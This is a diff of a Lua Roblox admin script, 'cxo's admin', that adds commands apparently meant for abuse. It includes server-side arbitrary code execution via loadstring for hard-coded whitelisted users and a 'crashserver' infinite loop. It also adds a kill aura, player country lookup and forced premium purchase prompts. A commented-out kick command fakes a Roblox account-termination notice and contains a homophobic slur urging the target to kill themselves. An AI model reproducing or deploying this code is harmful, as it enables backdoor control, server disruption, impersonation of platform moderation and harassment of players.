+		local m = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Chat_Message")
+		local r = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Run_Command")
+		local s = lp:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI"):FindFirstChild("Frame"):FindFirstChild("ContentFrame"):FindFirstChild("PanelFrame"):FindFirstChild("Panel_Frame"):FindFirstChild("Insert_Sudo")
+
+		local re = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("cxo's remote")
+		local UserInputService = game:GetService("UserInputService")
+
+		t1.Text = "Player 1"
+		t2.Text = "Player 2"
+		c.Text = "Command Name"
+		m.Text = "Message"
+
+		local pc = not UserInputService.TouchEnabled and not UserInputService.GamepadEnabled
+		local mobile = UserInputService.TouchEnabled
+		local console = UserInputService.GamepadEnabled
+
+		if pc then
+			r.MouseButton1Click:Connect(function()
+				re:FireServer("PanelCMD", c.Text, t1.Text, t2.Text, m.Text)
+			end)
+		elseif mobile then
+			r.InputBegan:Connect(function(input, process)
+				if not process and input.UserInputType == Enum.UserInputType.Touch then
+					re:FireServer("PanelCMD", c.Text, t1.Text, t2.Text, m.Text)
+				end
+			end)
+		elseif console then
+			r.InputBegan:Connect(function(input, process)
+				if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
+					if input.KeyCode == Enum.KeyCode.ButtonA or Enum.KeyCode.ButtonX then
+						re:FireServer("PanelCMD", c.Text, t1.Text, t2.Text, m.Text)
+					end
+				end
+			end)
+		end
+
+		t1.FocusLost:Connect(function()
+			re:FireServer("INFO", nil, t1.Text, nil, nil)
+		end)
+
+		t2.FocusLost:Connect(function()
+			re:FireServer("INFO", nil, nil, t2.Text, nil)
+		end)
+
+		if s then
+			if pc then
+				s.MouseButton1Click:Connect(function()
+					re:FireServer("SUDO", nil, nil, nil, nil)
+					s:Destroy()
+				end)
+			elseif mobile then
+				s.InputBegan:Connect(function(input, process)
+					if not process and input.UserInputType == Enum.UserInputType.Touch then
+						re:FireServer("SUDO", nil, nil, nil, nil)
+						s:Destroy()
+					end
+				end)
+			elseif console then
+				s.InputBegan:Connect(function(input, process)
+					if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
+						if input.KeyCode == Enum.KeyCode.ButtonA or Enum.KeyCode.ButtonX then
+							re:FireServer("SUDO", nil, nil, nil, nil)
+							s:Destroy()
+						end
+					end
+				end)
+			end
+		end
+	
+	]]
+
+	scr.Parent = plr:WaitForChild("PlayerGui"):FindFirstChild("cxo's admin GUI")
+
+	scr.Enabled = true
 
 	local minimized = true
-
 	local UserInputService = game:GetService("UserInputService")
 
 	local function minimize()
@@ -659,7 +1120,7 @@ function gui(plr, section)
 			end
 		end)
 		CommandsButton.InputBegan:Connect(function(input, process)
-			if not gameProcessed and input.UserInputType == Enum.UserInputType.Gamepad1 then
+			if not process and input.UserInputType == Enum.UserInputType.Gamepad1 then
 				if input.KeyCode == Enum.KeyCode.ButtonA or input.KeyCode == Enum.KeyCode.ButtonX then
 					switch(CommandsButton)
 				end
@@ -673,12 +1134,23 @@ function gui(plr, section)
 			end
 		end)
 	end
+
+	ScreenGui.Destroying:Connect(function()
+		if table.find(panelanticheat, plr.UserId) then
+			table.remove(panelanticheat, table.find(panelanticheat, plr.UserId))
+		end
+	end)
+
+	update()
 	if section == "cmdlist" then
+		task.wait(0.2)
 		switch(CommandsButton)
 	elseif section == "playerlist" then
+		task.wait(0.2)
 		switch(PlayerListButton)
-	else
-		switch(PlayerListButton)
+	elseif section == "panel" then
+		task.wait(0.2)
+		switch(SudoButton)
 	end
 end
 
@@ -687,7 +1159,11 @@ function notfi(plr, title, message, duration) -- dizzy ui
 
 		local s = Instance.new("ScreenGui")
 		s.Name = "NotificationsGui"
-		s.Parent = plr:FindFirstChild("PlayerGui")
+		if plr then
+			s.Parent = plr:FindFirstChild("PlayerGui")
+		else
+			return
+		end
 
 		local n = Instance.new("Frame")
 		n.Size = UDim2.new(0, 300, 0, 150)
@@ -763,6 +1239,8 @@ function notfi(plr, title, message, duration) -- dizzy ui
 	end)()
 end
 
+-------------------------------------------- COMMANDS --------------------------------------------
+
 addcmd({
 	Name = "kick",
 	Aliases = {"k"},
@@ -778,7 +1256,33 @@ addcmd({
 		end
 	end
 })
+--[[
+addcmd({
+	Name = "ckick",
+	Aliases = {"customkick", "ck"},
+	Function = function(sender, targets, arguments)
+		local msg = arguments[1]
+		local reason = table.concat(arguments, " ", 2)
 
+		if msg == "t" then
+			msg = "Account Deleted"
+			reason = "Our content monitors have determined that your behavior at Roblox has been in violation of our Terms of Use.\nYour account has been terminated.\n(Error code: 404)"
+		end
+
+		if reason == "" or reason == " " then
+			reason = "Kill yourself faggot\n(Error code: 666)"
+		end
+
+		if msg == "" or msg == " " then
+			msg = "cxo's admin"
+		end
+
+		for i, plr in ipairs(targets) do
+			
+		end
+	end
+})
+]]
 addcmd({
 	Name = "ban",
 	Aliases = {"b"},
@@ -838,8 +1342,51 @@ addcmd({
 })
 
 addcmd({
-	Name = "unban", -- dizzys gui again
-	Aliases = {"unb", "banlist", "bans"},
+	Name = "deleteban",
+	Aliases = {"db"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if not autodelete[plr.UserId] then
+				autodelete[plr.UserId] = plr.Name
+			end
+			plr:Destroy()
+		end
+	end
+})
+
+addcmd({
+	Name = "unban",
+	Aliases = {"unb"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local plr = table.concat(arguments, " ")
+
+		local success, fail = pcall(function()
+			plr = plr:GetUserIdFromNameAsync(plr)
+		end)
+
+		if fail then
+			notfi(sender, "cxo's admin", "Failed to get UserId, is the name correct?")
+			return
+		end
+
+		if banned[plr] then
+			banned[plr] = nil
+			notfi(sender, "cxo's admin", "unbanned successfully.")
+		elseif crashbanned[plr] then
+			crashbanned[plr] = nil
+			notfi(sender, "cxo's admin", "unbanned successfully.")
+		elseif autodelete[plr] then
+			autodelete[plr] = nil
+			notfi(sender, "cxo's admin", "unbanned successfully.")
+		end
+
+	end
+})
+
+addcmd({
+	Name = "bans", -- dizzys gui again
+	Aliases = {"banlist"},
 	Player = false,
 	Function = function(sender, targets, arguments)
 
@@ -961,7 +1508,7 @@ addcmd({
 			cblabel.Font = Enum.Font.Gotham
 			cblabel.TextSize = 16
 			cblabel.TextXAlignment = Enum.TextXAlignment.Left
-			cblabel.Parent = bframe
+			cblabel.Parent = cbframe
 
 			local uncbanb = Instance.new("TextButton")
 			uncbanb.Text = "Unban"
@@ -973,11 +1520,49 @@ addcmd({
 			uncbanb.BorderSizePixel = 0
 			uncbanb.Font = Enum.Font.GothamBold
 			uncbanb.TextSize = 14
-			uncbanb.Parent = bframe
+			uncbanb.Parent = cbframe
 
 			uncbanb.MouseButton1Click:Connect(function()
 				crashbanned[uid] = nil
-				bframe:Destroy()
+				cbframe:Destroy()
+			end)
+		end
+
+		for uid, user in pairs(autodelete) do
+			local adframe = Instance.new("Frame")
+			adframe.Size = UDim2.new(1, -10, 0, 30)
+			adframe.Position = UDim2.new(0, 5, 0, 0)
+			adframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+			adframe.BackgroundTransparency = 0.5
+			adframe.BorderSizePixel = 0
+			adframe.Parent = scroll
+
+			local adlabel = Instance.new("TextLabel")
+			adlabel.Text = user .. " | " .. tostring(uid)
+			adlabel.Size = UDim2.new(0.7, 0, 1, 0)
+			adlabel.Position = UDim2.new(0, 10, 0, 0)
+			adlabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+			adlabel.BackgroundTransparency = 1
+			adlabel.Font = Enum.Font.Gotham
+			adlabel.TextSize = 16
+			adlabel.TextXAlignment = Enum.TextXAlignment.Left
+			adlabel.Parent = adframe
+
+			local unadeleteb = Instance.new("TextButton")
+			unadeleteb.Text = "Unban"
+			unadeleteb.Size = UDim2.new(0.25, 0, 1, 0)
+			unadeleteb.Position = UDim2.new(0.75, 0, 0, 0)
+			unadeleteb.TextColor3 = Color3.fromRGB(255, 255, 255)
+			unadeleteb.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
+			unadeleteb.BackgroundTransparency = 0.2
+			unadeleteb.BorderSizePixel = 0
+			unadeleteb.Font = Enum.Font.GothamBold
+			unadeleteb.TextSize = 14
+			unadeleteb.Parent = adframe
+
+			unadeleteb.MouseButton1Click:Connect(function()
+				autodelete[uid] = nil
+				adframe:Destroy()
 			end)
 		end
 
@@ -995,10 +1580,30 @@ addcmd({
 		local code = table.concat(arguments, " ", 1)
 		for i, plr in ipairs(targets) do
 			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
-			local loa = game:GetService("ServerScriptService").goog.Utilities.loadstring:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
 			loa.Parent = scr
 			scr:WaitForChild("Exec").Value = code
-			scr.Parent = plr.Character
+
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+
 			scr.Enabled = true
 		end
 	end
@@ -1054,7 +1659,20 @@ addcmd({
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
 			local explosion = Instance.new("Explosion", workspace)
+			--explosion.BlastPressure = 0
+			explosion.BlastRadius = 50
 			explosion.Position = plr.Character.PrimaryPart.Position
+
+			local boomboom = Instance.new("Sound", plr.Character)
+			boomboom.SoundId = "rbxassetid://243702774"
+			boomboom.Volume = 7.5
+			boomboom.Pitch = 1.5
+			boomboom.Looped = false
+			boomboom.MaxDistance = 550
+			boomboom.EmitterSize = 75
+			boomboom.PlayOnRemove = false
+			boomboom.Playing = true
+			boomboom.Name = "explosion"
 		end
 	end
 })
@@ -1072,13 +1690,374 @@ addcmd({
 })
 
 addcmd({
+	Name = "killaura",
+	Aliases = {"kaura", "ka"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			
+			local aura = Instance.new("Part", plr.Character)
+			local weld = Instance.new("WeldConstraint", aura)
+
+			aura.CanCollide = false
+			aura.CastShadow = false
+			aura.Massless = true
+			aura.Size = Vector3.new(15, 0.1, 15)
+			aura.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -3, 0)
+			aura.Material = Enum.Material.Neon
+			aura.BrickColor = BrickColor.new("Really red")
+			aura.Locked = true
+			aura.Name = "killaura"
+
+			weld.Part0 = aura
+			weld.Part1 = plr.Character.HumanoidRootPart
+
+			aura.Touched:Connect(function(person)
+				local playuh = person.Parent
+				local playuhn = playuh.Name
+				if playuhn == plr.Name then return end
+				if playuhn == sender.Name then return end
+				if not playuh:FindFirstChild("Humanoid") then return playuh.Parent end
+
+				game.Players:FindFirstChild(playuhn).Character:FindFirstChild("Humanoid").Health = 0
+
+			end)
+
+		end
+	end
+})
+
+addcmd({
+	Name = "backpack",
+	Aliases = {"inventory"},
+	Function = function(sender, targets, arguments)
+
+		local option = arguments[1]
+
+		if option ~= "true" and option ~= "false" then
+			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."backpack cxo true")
+		end
+
+		for i, plr in ipairs(targets) do
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+			
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = string.format([[
+				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, %s)
+			]], option)
+
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+			scr.Enabled = true
+		end
+	end
+})
+
+addcmd({
+	Name = "mute",
+	Aliases = {"m"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			if table.find(Whitelist, tostring(plr.UserId)) then
+				notfi(sender, "cxo's admin", "You can not mute the head admins of this script!")
+			else
+				local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+				local utilities = game:GetService("ServerScriptService").goog.Utilities
+				local loa = utilities:FindFirstChild("loadstring")
+				
+				if loa then
+					loa = loa:Clone()
+				else
+					loa = utilities:FindFirstChild("Loadstring")
+					if loa then
+						loa = loa:Clone()
+					end
+				end
+				
+				if not loa then
+					warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+				end
+
+				loa.Parent = scr
+				scr:WaitForChild("Exec").Value = [[
+				
+					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+				
+				]]
+				if plr.Character then
+					scr.Parent = plr.Character
+				else
+					scr.Parent = plr:WaitForChild("PlayerGui")
+				end
+				scr.Enabled = true
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "unmute",
+	Aliases = {"unm"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+				
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = [[
+			
+				game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+			
+			]]
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+			scr.Enabled = true
+		end
+	end
+})
+
+addcmd({
+	Name = "disablereset",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+				
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = [[
+			
+				game:GetService("StarterGui"):SetCore("ResetButtonCallback", false)
+			
+			]]
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+			scr.Enabled = true
+		end
+	end
+})
+
+addcmd({
+	Name = "enablereset",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+				
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = [[
+			
+				game:GetService("StarterGui"):SetCore("ResetButtonCallback", true)
+			
+			]]
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+			scr.Enabled = true
+		end
+	end
+})
+
+addcmd({
+	Name = "maxzoom",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		local value = table.concat(arguments, " ")
+		for i, plr in ipairs(targets) do
+			plr.CameraMaxZoomDistance = value
+		end
+	end
+})
+
+addcmd({
+	Name = "fov",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		local value = arguments[1]
+		for i, plr in ipairs(targets) do
+			local scr = game:GetService("ServerScriptService").goog.Utilities.Client:Clone()
+			local utilities = game:GetService("ServerScriptService").goog.Utilities
+			local loa = utilities:FindFirstChild("loadstring")
+				
+			if loa then
+				loa = loa:Clone()
+			else
+				loa = utilities:FindFirstChild("Loadstring")
+				if loa then
+					loa = loa:Clone()
+				end
+			end
+			
+			if not loa then
+				warn("Could not find 'loadstring' or 'Loadstring' in goog.Utilities")
+			end
+
+			loa.Parent = scr
+			scr:WaitForChild("Exec").Value = string.format([[
+			
+				workspace.Camera.FieldOfView = %s
+			
+			]], value)
+			if plr.Character then
+				scr.Parent = plr.Character
+			else
+				scr.Parent = plr:WaitForChild("PlayerGui")
+			end
+			scr.Enabled = true
+			scr.Name = "FOV"
+		end
+	end
+})
+
+addcmd({
+	Name = "shiftlock",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		local option = table.concat(arguments, " ", 1)
+
+		if option ~= "true" and option ~= "false" then
+			notfi(sender, "cxo's admin", "The values are true or false! example: ".. prefix .."shiftlock cxo true")
+		end
+
+		local bool = (option == "true")
+
+		for i, plr in ipairs(targets) do
+			plr.DevEnableMouseLock = bool
+		end
+	end
+})
+
+addcmd({
+	Name = "minzoom",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		local value = table.concat(arguments, " ")
+		for i, plr in ipairs(targets) do
+			plr.CameraMinZoomDistance = value
+		end
+	end
+})
+
+addcmd({
+	Name = "premium",
+	Aliases = {"promptpremium"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			game:GetService("MarketplaceService"):PromptPremiumPurchase(plr)
+		end
+	end
+})
+
+addcmd({
+	Name = "rejoin",
+	Aliases = {"rj"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+
+			local options = Instance.new("TeleportOptions")
+			options.ServerInstanceId = game.JobId
+
+			game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {plr}, options)
+		end
+	end
+})
+
+addcmd({
+	Name = "crashserver",
+	Aliases = {"cserver"}, 
+	Function = function(sender, targets, arguments)
+		if table.find(Whitelist, tostring(sender.UserId)) then
+			while true do
+				for i = 1, 1000000 do
+					local a = Instance.new("Part", workspace)
+					a.CFrame = CFrame.new(0, 5, 0)
+					--a.Anchored = true
+				end
+				task.wait()
+			end
+
+		else
+			notfi(sender, "cxo's admin", "Due to misuse only the top admins can use this command!")
+		end
+	end
+})
+
+addcmd({
 	Name = "locate",
 	Aliases = {},
 	Function = function(sender, targets, arguments)
 		for i, plr in ipairs(targets) do
 			local success, code = pcall(game:GetService("LocalizationService").GetCountryRegionForPlayerAsync, game:GetService("LocalizationService"), plr)
 			if success and code then
-				notfi(sender, "Success", plr.Name .." is from: ".. countries[code])
+				notfi(sender, "cxo's admin", plr.Name .." is from: ".. countries[code])
 			end
 		end
 	end
@@ -1194,94 +2173,7 @@ addcmd({ -- Requested by punchy39, he gave da anim code
 		end
 	end
 })
---[[
-addcmd({
-	Name = "test",
-	Aliases = {},
-	Function = function(sender, targets, arguments)
-		for i, plr in ipairs(targets) do
-			if plr.Character and plr.Character:FindFirstChild("Humanoid") and plr.Character:FindFirstChild("Torso") then
-				local tip = Instance.new("Part", plr.Character)
-				local peep = Instance.new("Part", plr.Character)
-				local ball1 = Instance.new("Part", plr.Character)
-				local ball2 = Instance.new("Part", plr.Character)
-				
-				local tipmesh = Instance.new("SpecialMesh", tip)
-				local peepmesh = Instance.new("CylinderMesh", peep)
-				local ball1mesh = Instance.new("SpecialMesh", ball1)
-				local ball2mesh = Instance.new("SpecialMesh", ball2)
-				
-				local tipweld = Instance.new("WeldConstraint", plr.Character)
-				local peepweld = Instance.new("WeldConstraint", plr.Character)
-				local peepweld2 = Instance.new("WeldConstraint", peep)
-				local ball1weld = Instance.new("WeldConstraint", plr.Character)
-				local ball2weld = Instance.new("WeldConstraint", plr.Character)
-				
-				tip.BrickColor = BrickColor.new("Pink")
-				tip.Size = Vector3.new(1, 1, 1)
-				tip.BottomSurface = "Smooth"
-				tip.TopSurface = "Smooth"
-				tip.CanCollide = false
-				
-				peep.Color = plr.Character.Torso.Color
-				peep.Size = Vector3.new(0.4, 1.3, 0.4)
-				peep.BottomSurface = "Smooth"
-				peep.TopSurface = "Smooth"
-				peep.CanCollide = false
-				
-				ball1.Color = plr.Character.Torso.Color
-				ball1.Size = Vector3.new(1, 1, 1)
-				ball1.BottomSurface = "Smooth"
-				ball1.TopSurface = "Smooth"
-				ball1.CanCollide = false
-				
-				ball2.Color = plr.Character.Torso.Color
-				ball2.Size = Vector3.new(1, 1, 1)
-				ball2.BottomSurface = "Smooth"
-				ball2.TopSurface = "Smooth"
-				ball2.CanCollide = false
 
-				tipmesh.MeshType = "Sphere"
-				tipmesh.Scale = Vector3.new(0.4, 0.62, 0.4)
-				
-				ball1mesh.MeshType = "Sphere"
-				ball1mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
-				
-				ball2mesh.MeshType = "Sphere"
-				ball2mesh.Scale = Vector3.new(0.4, 0.4, 0.4)
-				
-				peep.CFrame = plr.Character.Torso.CFrame * CFrame.new(0, -1, -1.15) * CFrame.Angles(math.rad(90), 0, 0)
-				tip.CFrame = peep.CFrame * CFrame.new(0, -0.65, 0)
-				ball1.CFrame = peep.CFrame * CFrame.new(0.25, 0.6, 0.25)
-				ball2.CFrame = peep.CFrame * CFrame.new(-0.25, 0.6, 0.25)
-				
-				tipweld.Part0 = plr.Character.Torso
-				tipweld.Part1 = tip
-				
-				peepweld.Part0 = plr.Character.Torso
-				peepweld.Part1 = peep
-				
-				peepweld2.Part0 = peep
-				peepweld2.Part1 = tip
-				
-				ball1weld.Part0 = plr.Character.Torso
-				ball1weld.Part1 = ball1
-				
-				ball2weld.Part0 = plr.Character.Torso
-				ball2weld.Part1 = ball2
-				
-				local victim = workspace.d
-
-				victim.HumanoidRootPart.Anchored = true
-				victim.Humanoid.Sit = true
-				victim.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, -1, -2)
-				victim.HumanoidRootPart.Orientation = Vector3.new(-90, plr.Character.HumanoidRootPart.Orientation.Y, plr.Character.HumanoidRootPart.Orientation.Z)
-				-- weld them to you then cframe l8r
-			end
-		end
-	end
-})
-]]
 addcmd({
 	Name = "troll",
 	Aliases = {},
@@ -1304,12 +2196,545 @@ addcmd({
 })
 
 addcmd({
+	Name = "s",
+	Aliases = {"run", "code"},
+	Player = false,
+	Function = function(sender, targets, arguments) -- only the highest admins (hard coded) can use this, no temps
+		local code = table.concat(arguments, " ")
+		if table.find(Whitelist, tostring(sender.UserId)) then
+
+			local success, err = pcall(function()
+				loadstring(code)()
+			end)
+
+			if err then
+				notfi(sender, "cxo's admin", "Issue executing code: ".. err)
+			end
+
+		else
+			notfi(sender, "cxo's admin", "Only the top admins can use this command!")
+		end
+	end
+})
+
+addcmd({
+	Name = "destroy",
+	Aliases = {"remove"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local part = table.concat(arguments, " ")
+
+		if part == "Tabby" or part == "Terrain" then
+			notfi(sender, "cxo's admin", "You are not allowed to destroy this!")
+			return
+		end
+
+		if not game:GetService("Workspace"):FindFirstChild(part) then
+			notfi(sender, "cxo's admin", "Invalid object! This command checks the workspace for the object name and destroys it.")
+			return
+		end
+
+		local success, err = pcall(function()
+			game:GetService("Workspace"):FindFirstChild(part):Destroy()
+		end)
+
+		if err then
+			notfi(sender, "cxo's admin", "Issue destroying object: ".. err)
+		end
+
+	end
+})
+
+addcmd({ -- credits 2 iy ss
+	Name = "disco",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		nodisco = nil
+		coroutine.resume(coroutine.create(function()
+			repeat
+				game:GetService('Lighting').GlobalShadows = true
+				game:GetService('Lighting').FogEnd = 200
+				game:GetService('Lighting').TimeOfDay = 0
+				local r = 255
+				local g = 0
+				local b = 0
+				for i = 0,255,5 do
+					if nodisco ~=nil then return end
+					r = r - 5
+					b = b + 5
+					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
+					task.wait()
+				end
+				for i = 0,255,5 do
+					if nodisco ~=nil then return end
+					g = g + 5
+					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
+					task.wait()
+				end
+				for i = 0,255,5 do
+					if nodisco ~=nil then return end
+					b = b - 5
+					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
+					task.wait()
+				end
+				for i = 0,255,5 do
+					if nodisco ~=nil then return end
+					r = r + 5
+					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
+					task.wait()
+				end
+				for i = 0,255,5 do
+					if nodisco ~=nil then return end
+					g = g - 5
+					game:GetService('Lighting').Ambient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').OutdoorAmbient = Color3.fromRGB(r,g,b)
+					game:GetService('Lighting').FogColor = Color3.fromRGB(r,g,b)
+					task.wait()
+				end
+			until nodisco
+		end))
+	end
+})
+
+addcmd({
+	Name = "undisco",
+	Aliases = {},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		nodisco = true
+		task.wait()
+		game:GetService("Lighting").Ambient = Color3.new(0, 0, 0)
+		game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
+		game:GetService("Lighting").Brightness = 1.98
+		game:GetService("Lighting").ClockTime = 14
+		game:GetService("Lighting").FogColor = Color3.new(0, 0 ,0)
+		game:GetService("Lighting").FogEnd = 100000
+		game:GetService("Lighting").FogStart = 0
+	end
+})
+--[[ coming soon
+addcmd({
+	Name = "fly",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			
+		end
+	end
+})
+]]
+addcmd({
+	Name = "startergear",
+	Aliases = {"startertool"},
+	Function = function(sender, targets, arguments)
+		local arg = table.concat(arguments, " ", 1)
+		local tool
+
+		if arg == "" then
+			if sender.Character then
+				if sender.Character:FindFirstChildOfClass("Tool") then
+					tool = sender.Character:FindFirstChildOfClass("Tool"):Clone()
+				elseif sender.Backpack:FindFirstChildOfClass("Tool") then
+					tool = sender.Backpack:FindFirstChildOfClass("Tool"):Clone()
+				else
+					notfi(sender, "cxo's admin", "No tool found in your backpack or character!")
+				end
+			else
+				notfi(sender, "cxo's admin", "You dont have a character!")
+			end
+		else
+			tool = arg
+			local success, gear = pcall(function()
+				return game:GetService("InsertService"):LoadAsset(tool)
+			end)
+
+			if success and gear then
+				tool = gear:FindFirstChildOfClass("Tool")
+			else
+				notfi(sender, "cxo's admin", "Invalid gear id!")
+			end
+		end
+
+		for i, plr in ipairs(targets) do
+			local backpacktool = tool:Clone()
+			backpacktool.Parent = plr.Backpack
+			tool.Parent = plr.StarterGear
+		end
+	end
+})
+
+addcmd({
+	Name = "unstartergear",
+	Aliases = {"unstartertool", "nostartergear", "nostartertool"},
+	Function = function(sender, targets, arguments)
+		for i, plr in ipairs(targets) do
+			for i, tool in pairs(plr.StarterGear:GetChildren()) do
+				tool:Destroy()
+			end
+		end
+	end
+})
+
+addcmd({
+	Name = "musiclock",
+	Aliases = {"musicloop", "lockmusic"},
+	Player = false,
+	Function = function(sender, targets, arguments)
+		local arg = arguments[1]
+
+		for i,v in pairs(game.Soundscape:GetChildren()) do
+			if v:IsA("Sound") then
+				v:Destroy()
+			end
+		end
+
+		if arg ~= "" and arg ~= "n" and arg ~= "t" then
+			music = Instance.new("Sound", game.Soundscape)
+			music.SoundId = arg
+			music.Name = "cxo's admin sound"
+
+			if music.Playing == false then
+				music.Playing = true
+			end
+			
+			if music.Looped == false then
+				music.Looped = true
+			end
+
+			if music.Volume == 0 then
+				music.Volume = 1
+			end
+
+			return
+		elseif arg == "n" then
+			music = Instance.new("Sound", game.Soundscape)
+			music.SoundId = "rbxassetid://140555145345310"
+			music.Name = "cxo's admin sound"
+
+			if music.Playing == false then
+				music.Playing = true
+			end
+			
+			if music.Looped == false then
+				music.Looped = true
+			end
+
+			if music.Volume == 0 then
+				music.Volume = 1
+			end
+
+			return
+		elseif arg == "t" then
+			music = Instance.new("Sound", game.Soundscape)
+			music.SoundId = "rbxassetid://401117743"
+			music.Name = "cxo's admin sound"
+
+			if music.Playing == false then
+				music.Playing = true
+			end
+			
+			if music.Looped == false then
+				music.Looped = true
+			end
+
+			if music.Volume == 0 then
+				music.Volume = 1
+			end
+
+			return
+		end
+
+		if game:GetService("Workspace"):FindFirstChildOfClass("Sound") then
+			music = game:GetService("Workspace"):FindFirstChild("Sound")
+			music.Parent = game.Soundscape
